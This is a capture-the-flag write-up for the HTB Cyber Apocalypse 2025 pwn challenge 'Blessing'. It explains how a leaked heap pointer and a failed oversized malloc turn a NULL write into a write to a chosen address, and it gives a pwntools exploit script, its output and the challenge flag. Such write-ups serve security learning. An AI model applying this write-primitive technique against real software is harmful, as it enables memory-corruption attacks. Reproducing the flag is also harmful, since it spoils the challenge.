# 2025 HTB Cyber Apocalypse CTF - Blessing

This is a classic pwn challenge where only one binary is given. This one seemed to be pretty simple:
```
  local_20 = (long *)malloc(0x30000);
  *local_20 = 1;
  printstr(
          "In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gif t!\n\nPlease accept this: "
          );
  printf("%p",local_20);
  sleep(1);
  for (local_28 = 0; local_28 < 0xe; local_28 = local_28 + 1) {
    printf("\b \b");
    usleep(60000);
  }
  puts("\n");
  printf("%s[%sBard%s]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song\ 's length: "
         ,&DAT_00102063,&DAT_00102643,&DAT_00102063);
  __isoc99_scanf(&DAT_001026b1,&local_30);
  local_18 = malloc(local_30);
  printf("\n%s[%sBard%s]: Excellent! Now tell me the song: ",&DAT_00102063,&DAT_00102643,
         &DAT_00102063);
  read(0,local_18,local_30);
  *(undefined8 *)((long)local_18 + (local_30 - 1)) = 0;
  write(1,local_18,local_30);
  if (*local_20 == 0) {
    read_flag();
  }
```

The idea is to rewrite heap memory where `local_20` variable points to. The pointer of the variable is given in the first `printstr` function.

In subsequent call, binary asks for a length which is used for the `malloc` call. To overwrite `*local_20` we would need to write the appropriate size so that the following line writes NULL to the same memory area to which `local_20` points to:
```
*(undefined8 *)((long)local_18 + (local_30 - 1)) = 0;
```

Best way to do this is to set `local_30` to the value of the address printed by the first `printstr` since the result of the malloc will be NULL, effectively setting `local_18` variable to 0 (because malloc size is too big and allocation fails). Taking this into account, the line that writes to our defined memory will write NULL to `0 + local_30 - 1` where `local_30 - 1` equals to `local_20`.

The exploit script is rather simple:
```python3
from pwn import *

r = process("./blessing")
#gdb.attach(r, '''
#set follow-fork-mode child
#b main
#b setup
#b write
#continue
#''')

r.recvuntil(b"this: ")
leak = int(r.recvuntil(b"\x08")[:-1], 16)
print(leak)

r.recvuntil(b"length: ")
r.sendline(str(leak).encode())
r.recvuntil(b"song: ")
r.sendline(b"\x00")
r.interactive()
```

Local execution:
```
$ python3 xpl.py 
[+] Starting local process './blessing': pid 9125
140706527404048
[*] Switching to interactive mode
[*] Process './blessing' stopped with exit code 0 (pid 9125)
HTB{f4k3_fl4g_f0r_t35t1ng}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
```

```
HTB{3v3ryth1ng_l00k5_345y_w1th_l34k5_6ce17069e4ec01d2487800bcbe9509c0}
```
